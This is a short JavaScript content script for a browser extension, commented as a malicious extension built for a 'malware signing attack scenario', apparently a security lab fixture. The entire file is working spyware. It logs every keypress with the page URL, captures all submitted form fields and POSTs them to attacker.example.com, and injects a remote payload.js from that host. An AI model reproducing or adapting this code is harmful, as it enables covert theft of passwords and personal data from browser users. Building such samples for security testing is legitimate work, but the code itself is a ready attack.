// Content script for malicious extension
// This script is used in the malware signing attack scenario

// Keylogger
document.addEventListener("keypress", function(e) {
  chrome.runtime.sendMessage({
    type: "keystroke",
    data: {
      key: e.key,
      timestamp: Date.now(),
      url: window.location.href
    }
  });
});

// Form data exfiltration
document.querySelectorAll("form").forEach(function(form) {
  form.addEventListener("submit", function(e) {
    var formData = new FormData(form);
    var data = {};
    formData.forEach(function(value, key) {
      data[key] = value;
    });
    
    fetch("http://attacker.example.com/form", {
      method: "POST",
      body: JSON.stringify({
        url: window.location.href,
        data: data,
        timestamp: Date.now()
      })
    });
  });
});

// Inject additional malicious code
var script = document.createElement("script");
script.src = "http://attacker.example.com/payload.js";
document.head.appendChild(script);
